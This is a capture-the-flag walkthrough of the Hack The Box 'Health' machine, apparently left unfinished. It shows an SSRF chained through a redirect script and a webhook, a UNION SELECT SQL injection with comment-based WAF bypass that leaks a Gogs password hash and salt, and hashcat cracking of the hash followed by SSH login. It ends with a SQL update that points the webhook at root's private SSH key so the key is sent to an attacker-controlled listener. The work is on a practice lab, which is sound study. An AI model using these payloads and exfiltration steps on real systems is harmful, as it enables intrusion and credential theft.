# Incomplete


![image](https://user-images.githubusercontent.com/105310322/194118518-d3bfb867-a11d-4800-80b0-a4fcc96a6e7e.png)


### Tools: Redirect.py, Burpsuite, Hashcat, 

### Vulnerabilities: URL Redirect, SQLI Union Select: WAF bypass, Salted Hash,

Nmap reveals ssh, a webpage and a filtered port 3000.

```console
└─$ nmap -A -p- -T4 -Pn 10.129.61.202
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-05 12:08 CDT
Nmap scan report for 10.129.61.202
Host is up (0.038s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 32:b7:f4:d4:2f:45:d3:30:ee:12:3b:03:67:bb:e6:31 (RSA)
|   256 86:e1:5d:8c:29:39:ac:d7:e8:15:e6:49:e2:35:ed:0c (ECDSA)
|_  256 ef:6b:ad:64:d5:e4:5b:3e:66:79:49:f4:ec:4c:23:9f (ED25519)
80/tcp   open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HTTP Monitoring Tool
3000/tcp filtered ppp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.07 seconds

```

The webpage is a health check site for checking any webpage. I tried a few things but the way to go was to access the port 3000 site that was running off their local host. Trying to check their localhost:3000 returns an error that it is not allowed.


![image](https://user-images.githubusercontent.com/105310322/194422971-3e1a3fe7-ae24-4551-a31e-ccecc0f3e0e6.png)



So to get around this problem we need to redirect to the url through health.htb. The link below is for a simple python script to redirect.

```https://gist.github.com/shreddd/b7991ab491384e3c3331```

After setting up the redirect dont forget to set up the nc listner to catch the page.

```console
└─$ python2 redirect.py --port 80 --ip 10.10.16.19 http://127.0.0.1:3000
serving at port 80
10.129.61.202 - - [05/Oct/2022 14:22:23] "GET / HTTP/1.0" 301 -
```

Next we input the following into the fields on the webpage.

```
http://10.10.16.19:1234
http://10.10.16.19
*5/ * * * *
```

The file comes out in extended format so we have to format it so we can access the webpage.

In visual studio I changed all of occurences of /n with an enter, /t with a tab, and every \/ with a /.

```console
─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.19] from (UNKNOWN) [10.129.61.202] 55584
POST / HTTP/1.1
Host: 10.10.16.19:1234
Accept: */*
Content-type: application/json
Content-Length: 7673
Expect: 100-continue

{"webhookUrl":"http:\/\/10.10.16.19:1234","monitoredUrl":"http:\/\/10.10.16.19","health":"up","body":"<!DOCTYPE html>\n<html>\n\t<head data-suburl=\"\">\n\t\t<meta http-equiv=\"Content-Type\" content=\"text\/html; charset=UTF-8\" \/>\n        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\/>\n        <meta name=\"author\" content=\"Gogs - Go Git Service\" \/>\n\t\t<meta name=\"description\" content=\"Gogs(Go Git Service) a painless self-hosted Git Service written in Go\" \/>\n\t\t<meta name=\"keywords\" content=\"go, git, self-hosted, gogs\">\n\t\t<meta name=\"_csrf\" content=\"BDlIqfJQYjaar98jEHrjqkNQ3M46MTY2NDk5Nzc0Mjc0Nzg0ODcxNA==\" \/>\n\t\t\n\n\t\t<link rel=\"shortcut icon\" href=\"\/img\/favicon.png\" \/>\n\n\t\t\n\t\t<link rel=\"stylesheet\" href=\"\/\/maxcdn.bootstrapcdn.com\/font-awesome\/4.2.0\/css\/font-awesome.min.css\">\n\n\t\t<script src=\"\/\/code.jquery.com\/jquery-1.11.1.min.js\"><\/script>\n\t\t\n\t\t\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/ui.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/gogs.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/tipsy.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/css\/magnific-popup.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/ng\/fonts\/octicons.css\">\n\t\t<link rel=\"stylesheet\" href=\"\/css\/github.min.css\">\n\n\t\t\n    \t<script src=\"\/ng\/js\/lib\/lib.js\"><\/script>\n    \t<script src=\"\/ng\/js\/lib\/jquery.tipsy.js\"><\/script>\n    \t<script src=\"\/ng\/js\/lib\/jquery.magnific-popup.min.js\"><\/script>\n        <script src=\"\/ng\/js\/utils\/tabs.js\"><\/script>\n        <script src=\"\/ng\/js\/utils\/preview.js\"><\/script>\n\t\t<script src=\"\/ng\/js\/gogs.js\"><\/script>\n\n\t\t<title>Gogs: Go Git Service<\/title>\n\t<\/head>\n\t<body>\n\t\t<div id=\"wrapper\">\n\t\t<noscript>Please enable JavaScript in your browser!<\/noscript>\n\n<header id=\"header\">\n    <ul class=\"menu menu-line container\" id=\"header-nav\">\n        \n\n        \n            \n            <li class=\"right\" id=\"header-nav-help\">\n                <a target=\"_blank\" href=\"http:\/\/gogs.io\/docs\"><i class=\"octicon octicon-info\"><\/i>&nbsp;&nbsp;Help<\/a>\n            <\/li>\n            <li class=\"right\" id=\"header-nav-explore\">\n                <a href=\"\/explore\"><i class=\"octicon octicon-globe\"><\/i>&nbsp;&nbsp;Explore<\/a>\n            <\/li>\n            \n        \n    <\/ul>\n<\/header>\n<div id=\"promo-wrapper\">\n    <div class=\"container clear\">\n        <div id=\"promo-logo\" class=\"left\">\n            <img src=\"\/img\/gogs-lg.png\" alt=\"logo\" \/>\n        <\/div>\n        <div id=\"promo-content\">\n            <h1>Gogs<\/h1>\n            <h2>A painless self-hosted Git service written in Go<\/h2>\n            <form id=\"promo-form\" action=\"\/user\/login\" method=\"post\">\n                <input type=\"hidden\" name=\"_csrf\" value=\"BDlIqfJQYjaar98jEHrjqkNQ3M46MTY2NDk5Nzc0Mjc0Nzg0ODcxNA==\">\n                <input class=\"ipt ipt-large\" id=\"username\" name=\"uname\" type=\"text\" placeholder=\"Username or E-mail\"\/>\n                <input class=\"ipt ipt-large\" name=\"password\" type=\"password\" placeholder=\"Password\"\/>\n                <input name=\"from\" type=\"hidden\" value=\"home\">\n                <button class=\"btn btn-black btn-large\">Sign In<\/button>\n                <button class=\"btn btn-green btn-large\" id=\"register-button\">Register<\/button>\n            <\/form>\n            <div id=\"promo-social\" class=\"social-buttons\">\n                \n\n\n\n            <\/div>\n        <\/div>&nbsp;\n    <\/div>\n<\/div>\n<div id=\"feature-wrapper\">\n    <div class=\"container clear\">\n        \n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-flame\"><\/i>\n            <b>Easy to install<\/b>\n            <p>Simply <a target=\"_blank\" href=\"http:\/\/gogs.io\/docs\/installation\/install_from_binary.html\">run the binary<\/a> for your platform. Or ship Gogs with <a target=\"_blank\" href=\"https:\/\/github.com\/gogits\/gogs\/tree\/master\/dockerfiles\">Docker<\/a> or <a target=\"_blank\" href=\"https:\/\/github.com\/geerlingguy\/ansible-vagrant-examples\/tree\/master\/gogs\">Vagrant<\/a>, or get it <a target=\"_blank\" href=\"http:\/\/gogs.io\/docs\/installation\/install_from_packages.html\">packaged<\/a>.<\/p>\n        <\/div>\n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-device-desktop\"><\/i>\n            <b>Cross-platform<\/b>\n            <p>Gogs runs anywhere <a target=\"_blank\" href=\"http:\/\/golang.org\/\">Go<\/a> can compile for: Windows, Mac OS X, Linux, ARM, etc. Choose the one you love!<\/p>\n        <\/div>\n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-rocket\"><\/i>\n            <b>Lightweight<\/b>\n            <p>Gogs has low minimal requirements and can run on an inexpensive Raspberry Pi. Save your machine energy!<\/p>\n        <\/div>\n        <div class=\"grid-1-2 left\">\n            <i class=\"octicon octicon-code\"><\/i>\n            <b>Open Source<\/b>\n            <p>It's all on <a target=\"_blank\" href=\"https:\/\/github.com\/gogits\/gogs\/\">GitHub<\/a>! Join us by contributing to make this project even better. Don't be shy to be a contributor!<\/p>\n        <\/div>\n        \n    <\/div>\n<\/div>\n\t\t<\/div>\n\t\t<footer id=\"footer\">\n\t\t    <div class=\"container clear\">\n\t\t        <p class=\"left\" id=\"footer-rights\">\u00a9 2014 GoGits \u00b7 Version: 0.5.5.1010 Beta \u00b7 Page: <strong>1ms<\/strong> \u00b7\n\t\t            Template: <strong>1ms<\/strong><\/p>\n\n\t\t        <div class=\"right\" id=\"footer-links\">\n\t\t            <a target=\"_blank\" href=\"https:\/\/github.com\/gogits\/gogs\"><i class=\"fa fa-github-square\"><\/i><\/a>\n\t\t            <a target=\"_blank\" href=\"https:\/\/twitter.com\/gogitservice\"><i class=\"fa fa-twitter\"><\/i><\/a>\n\t\t            <a target=\"_blank\" href=\"https:\/\/plus.google.com\/communities\/115599856376145964459\"><i class=\"fa fa-google-plus\"><\/i><\/a>\n\t\t            <a target=\"_blank\" href=\"http:\/\/weibo.com\/gogschina\"><i class=\"fa fa-weibo\"><\/i><\/a>\n\t\t            <div id=\"footer-lang\" class=\"inline drop drop-top\">Language\n\t\t                <div class=\"drop-down\">\n\t\t                    <ul class=\"menu menu-vertical switching-list\">\n\t\t                    \t\n\t\t                        <li><a href=\"#\">English<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=zh-CN\">\u7b80\u4f53\u4e2d\u6587<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=zh-HK\">\u7e41\u9ad4\u4e2d\u6587<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=de-DE\">Deutsch<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=fr-CA\">Fran\u00e7ais<\/a><\/li>\n\t\t                        \n\t\t                        <li><a href=\"\/?lang=nl-NL\">Nederlands<\/a><\/li>\n\t\t                        \n\t\t                    <\/ul>\n\t\t                <\/div>\n\t\t            <\/div>\n\t\t            <a target=\"_blank\" href=\"http:\/\/gogs.io\">Website<\/a>\n\t\t            <span class=\"version\">Go1.3.2<\/span>\n\t\t        <\/div>\n\t\t    <\/div>\n\t\t<\/footer>\n\t<\/body>\n<\/html>","message":"HTTP\/1.0 301 Moved Permanently","headers":{"Server":"SimpleHTTP\/0.6 Python\/2.7.18","Date":"Wed, 05 Oct 2022 19:22:22 GMT","Location":"http:\/\/127.0.0.1:3000","Content-Type":"text\/html; charset=UTF-8","Set-Cookie":"_csrf=; Path=\/; Max-Age=0"}}
```

After formatting it we get an html that looks much nicer.

```html
<!DOCTYPE html>
<html>
        <head data-suburl=\"\">
          <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />
        <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"/>
        <meta name=\"author\" content=\"Gogs - Go Git Service\" />
      <meta name=\"description\" content=\"Gogs(Go Git Service) a painless self-hosted Git Service written in Go\" />
      <meta name=\"keywords\" content=\"go, git, self-hosted, gogs\">
      <meta name=\"_csrf\" content=\"UcYB42HBSsgkVcKcryR8UdDVpgE6MTY2NDk5ODM1NjQxMTgwOTQxMQ==\" />
      

      <link rel=\"shortcut icon\" href=\"/img/favicon.png\" />

      
      <link rel=\"stylesheet\" href=\"//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css\">

      <script src=\"//code.jquery.com/jquery-1.11.1.min.js\"></script>
      
      
      <link rel=\"stylesheet\" href=\"/ng/css/ui.css\">
      <link rel=\"stylesheet\" href=\"/ng/css/gogs.css\">
      <link rel=\"stylesheet\" href=\"/ng/css/tipsy.css\">
      <link rel=\"stylesheet\" href=\"/ng/css/magnific-popup.css\">
      <link rel=\"stylesheet\" href=\"/ng/fonts/octicons.css\">
      <link rel=\"stylesheet\" href=\"/css/github.min.css\">

      
        <script src=\"/ng/js/lib/lib.js\"></script>
        <script src=\"/ng/js/lib/jquery.tipsy.js\"></script>
        <script src=\"/ng/js/lib/jquery.magnific-popup.min.js\"></script>
        <script src=\"/ng/js/utils/tabs.js\"></script>
        <script src=\"/ng/js/utils/preview.js\"></script>
      <script src=\"/ng/js/gogs.js\"></script>

      <title>Gogs: Go Git Service</title>
    </head>
    <body>
      <div id=\"wrapper\">
      <noscript>Please enable JavaScript in your browser!</noscript>

<header id=\"header\">
    <ul class=\"menu menu-line container\" id=\"header-nav\">
        

        
            
            <li class=\"right\" id=\"header-nav-help\">
                <a target=\"_blank\" href=\"http://gogs.io/docs\"><i class=\"octicon octicon-info\"></i>&nbsp;&nbsp;Help</a>
            </li>
            <li class=\"right\" id=\"header-nav-explore\">
                <a href=\"/explore\"><i class=\"octicon octicon-globe\"></i>&nbsp;&nbsp;Explore</a>
            </li>
            
        
    </ul>
</header>
<div id=\"promo-wrapper\">
    <div class=\"container clear\">
        <div id=\"promo-logo\" class=\"left\">
            <img src=\"/img/gogs-lg.png\" alt=\"logo\" />
        </div>
        <div id=\"promo-content\">
            <h1>Gogs</h1>
            <h2>A painless self-hosted Git service written in Go</h2>
            <form id=\"promo-form\" action=\"/user/login\" method=\"post\">
                <input type=\"hidden\" name=\"_csrf\" value=\"UcYB42HBSsgkVcKcryR8UdDVpgE6MTY2NDk5ODM1NjQxMTgwOTQxMQ==\">
                <input class=\"ipt ipt-large\" id=\"username\" name=\"uname\" type=\"text\" placeholder=\"Username or E-mail\"/>
                <input class=\"ipt ipt-large\" name=\"password\" type=\"password\" placeholder=\"Password\"/>
                <input name=\"from\" type=\"hidden\" value=\"home\">
                <button class=\"btn btn-black btn-large\">Sign In</button>
                <button class=\"btn btn-green btn-large\" id=\"register-button\">Register</button>
            </form>
            <div id=\"promo-social\" class=\"social-buttons\">
                



            </div>
        </div>&nbsp;
    </div>
</div>
<div id=\"feature-wrapper\">
    <div class=\"container clear\">
        
        <div class=\"grid-1-2 left\">
            <i class=\"octicon octicon-flame\"></i>
            <b>Easy to install</b>
            <p>Simply <a target=\"_blank\" href=\"http://gogs.io/docs/installation/install_from_binary.html\">run the binary</a> for your platform. Or ship Gogs with <a target=\"_blank\" href=\"https://github.com/gogits/gogs/tree/master/dockerfiles\">Docker</a> or <a target=\"_blank\" href=\"https://github.com/geerlingguy/ansible-vagrant-examples/tree/master/gogs\">Vagrant</a>, or get it <a target=\"_blank\" href=\"http://gogs.io/docs/installation/install_from_packages.html\">packaged</a>.</p>
        </div>
        <div class=\"grid-1-2 left\">
            <i class=\"octicon octicon-device-desktop\"></i>
            <b>Cross-platform</b>
            <p>Gogs runs anywhere <a target=\"_blank\" href=\"http://golang.org/\">Go</a> can compile for: Windows, Mac OS X, Linux, ARM, etc. Choose the one you love!</p>
        </div>
        <div class=\"grid-1-2 left\">
            <i class=\"octicon octicon-rocket\"></i>
            <b>Lightweight</b>
            <p>Gogs has low minimal requirements and can run on an inexpensive Raspberry Pi. Save your machine energy!</p>
        </div>
        <div class=\"grid-1-2 left\">
            <i class=\"octicon octicon-code\"></i>
            <b>Open Source</b>
            <p>It's all on <a target=\"_blank\" href=\"https://github.com/gogits/gogs/\">GitHub</a>! Join us by contributing to make this project even better. Don't be shy to be a contributor!</p>
        </div>
        
    </div>
</div>
      </div>
      <footer id=\"footer\">
          <div class=\"container clear\">
              <p class=\"left\" id=\"footer-rights\">\u00a9 2014 GoGits \u00b7 Version: 0.5.5.1010 Beta \u00b7 Page: <strong>0ms</strong> \u00b7
                  Template: <strong>0ms</strong></p>

              <div class=\"right\" id=\"footer-links\">
                  <a target=\"_blank\" href=\"https://github.com/gogits/gogs\"><i class=\"fa fa-github-square\"></i></a>
                  <a target=\"_blank\" href=\"https://twitter.com/gogitservice\"><i class=\"fa fa-twitter\"></i></a>
                  <a target=\"_blank\" href=\"https://plus.google.com/communities/115599856376145964459\"><i class=\"fa fa-google-plus\"></i></a>
                  <a target=\"_blank\" href=\"http://weibo.com/gogschina\"><i class=\"fa fa-weibo\"></i></a>
                  <div id=\"footer-lang\" class=\"inline drop drop-top\">Language
                      <div class=\"drop-down\">
                          <ul class=\"menu menu-vertical switching-list\">
                              
                              <li><a href=\"#\">English</a></li>
                              
                              <li><a href=\"/?lang=zh-CN\">\u7b80\u4f53\u4e2d\u6587</a></li>
                              
                              <li><a href=\"/?lang=zh-HK\">\u7e41\u9ad4\u4e2d\u6587</a></li>
                              
                              <li><a href=\"/?lang=de-DE\">Deutsch</a></li>
                              
                              <li><a href=\"/?lang=fr-CA\">Fran\u00e7ais</a></li>
                              
                              <li><a href=\"/?lang=nl-NL\">Nederlands</a></li>
                              
                          </ul>
                      </div>
                  </div>
                  <a target=\"_blank\" href=\"http://gogs.io\">Website</a>
                  <span class=\"version\">Go1.3.2</span>
              </div>
          </div>
      </footer>
    </body>
</html>
```

Now if we drag and drop the html file into our browser we can access the static page which is a gogs webpage.


![image](https://user-images.githubusercontent.com/105310322/194423032-053f5637-9867-4d25-9e2c-6569643c4d6a.png)


There is a nice PoC exploit for this that will speed this next part up.

https://www.exploit-db.com/exploits/35238

The PoC gives us a template for how we can make our union select payload. By formatting the PoC for our uses we can see that it takes in 27 slots, in the 3rd slot we can put our tables that we want to leak.

By formating the PoC we can more quickly get the result we are looking for since we do not have to manually input everything.

Fire up burpsuite with the payload URL and monitored URL to speed up your trial and error process.

Note: From hacktricks this is a WAF bypass and no whitespace is needed in the URL payload. 

```https://book.hacktricks.xyz/pentesting-web/sql-injection```


Input the the payload as follows.

```
└─$ python2.7 redirect.py --port 80 --ip 10.10.16.19 "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,(select/**/passwd/**/from/**/user),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--"
serving at port 80
10.129.61.202 - - [05/Oct/2022 15:18:37] "GET / HTTP/1.0" 301 -
```

On our listner we will capture a hashed password and the username susanne

```66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37```

```console
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.19] from (UNKNOWN) [10.129.61.202] 53318
POST / HTTP/1.1
Host: 10.10.16.19:1234
Accept: */*
Content-type: application/json
Content-Length: 846

{"webhookUrl":"http:\/\/10.10.16.19:1234","monitoredUrl":"http:\/\/10.10.16.19","health":"up","body":"{\"data\":[{\"username\":\"susanne\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce\"},{\"username\":\"66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/1\"}],\"ok\":true}","message":"HTTP\/1.0 301 Moved Permanently","headers":{"Server":"SimpleHTTP\/0.6 Python\/2.7.18","Date":"Wed, 05 Oct 2022 21:09:25 GMT","Location":"http:\/\/127.0.0.1:3000\/api\/v1\/users\/search?q=')\/**\/union\/**\/all\/**\/select\/**\/1,1,(select\/**\/passwd\/**\/from\/**\/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--","Content-Type":"application\/json; charset=UTF-8","Set-Cookie":"_csrf=; Path=\/; Max-Age=0","Content-Length":"264"}}

```
And this payload gives us the salt for the hash.

```sO3XIbeW14```

```console
└─$ python2.7 redirect.py --port 80 --ip 10.10.16.19 "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,(select/**/salt/**/from/**/user),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--"
serving at port 80
10.129.61.202 - - [05/Oct/2022 15:18:37] "GET / HTTP/1.0" 301 -
```
```console
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.19] from (UNKNOWN) [10.129.61.202] 43302
POST / HTTP/1.1
Host: 10.10.16.19:1234
Accept: */*
Content-type: application/json
Content-Length: 754

{"webhookUrl":"http:\/\/10.10.16.19:1234","monitoredUrl":"http:\/\/10.10.16.19","health":"up","body":"{\"data\":[{\"username\":\"susanne\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce\"},{\"username\":\"sO3XIbeW14\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/1\"}],\"ok\":true}","message":"HTTP\/1.0 301 Moved Permanently","headers":{"Server":"SimpleHTTP\/0.6 Python\/2.7.18","Date":"Wed, 05 Oct 2022 21:06:48 GMT","Location":"http:\/\/127.0.0.1:3000\/api\/v1\/users\/search?q=')\/**\/union\/**\/all\/**\/select\/**\/1,1,(select\/**\/salt\/**\/from\/**\/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--","Content-Type":"application\/json; charset=UTF-8","Set-Cookie":"_csrf=; Path=\/; Max-Age=0","Content-Length":"174"}}
```

### For this hash cracking portion help was needed and appreciated!

Now in order to actually decrypt this hash we have to convert back into hex and then base64.

```console
└─$ echo '66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37' | xxd -r -ps | base64
ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
```

Then also base64 encode the salt.

Note: it is also required to take off the ```o=```

```console
└─$ echo 'sO3XIbeW14' |base64    
c08zWEliZVcxNAo=
```

Then create a file and put ```sha256:10000:c08zWEliZVcxNA:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=``` inside it

Run hashcat and it will auto detect it as PBKDF2-HMAC-SHA256.

Then we finally get the password february 15!

```console
└─$ hashcat  hash /usr/share/wordlists/rockyou.txt  
hashcat (v6.2.5) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Xeon(R) Gold 5222 CPU @ 3.80GHz, 6947/13958 MB (2048 MB allocatable), 4MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10900 | PBKDF2-HMAC-SHA256 | Generic KDF

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

sha256:10000:c08zWEliZVcxNA:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=:february15
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: sha256:10000:c08zWEliZVcxNA:ZsB0ZFVFeB8QZPt/0Rd0U9u...9O/jc=
Time.Started.....: Wed Oct  5 15:32:20 2022 (6 secs)
Time.Estimated...: Wed Oct  5 15:32:26 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    10630 H/s (8.13ms) @ Accel:512 Loops:512 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests
Progress.........: 71680/14344385 (0.50%)
Rejected.........: 0/71680 (0.00%)
Restore.Point....: 69632/14344385 (0.49%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:9728-9999
Candidate.Engine.: Device Generator
Candidates.#1....: 030979 -> 280282
Hardware.Mon.#1..: Util: 98%
```

Now we can login with the credentials we cracked.

```
susanne
february15
```

```
└─$ ssh susanne@health.htb                         
The authenticity of host 'health.htb (10.129.61.202)' can't be established.
ED25519 key fingerprint is SHA256:K0WrmjTWDZhl/D/mYbJSv/cBLF1Jnx0T2auXQQDc7/Q.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'health.htb' (ED25519) to the list of known hosts.
susanne@health.htb's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-191-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Oct  5 20:35:35 UTC 2022

  System load:  0.05              Processes:           176
  Usage of /:   68.7% of 3.84GB   Users logged in:     0
  Memory usage: 16%               IP address for eth0: 10.129.61.202
  Swap usage:   0%


0 updates can be applied immediately.


susanne@health:~$ 
```
```
susanne@health:~$ cat user.txt 
7aca7***************************
```



```console
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=laravel
DB_USERNAME=laravel
DB_PASSWORD=MYsql_strongestpass@2014+
```
```console
susanne@health:/var/www/html/.git$ mysql -u laravel -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 58
Server version: 5.7.39-0ubuntu0.18.04.2 (Ubuntu)

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use laravel
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> update tasks set monitoredUrl='file:///root/.ssh/id_rsa';
Query OK, 0 rows affected (0.00 sec)
Rows matched: 0  Changed: 0  Warnings: 0
```
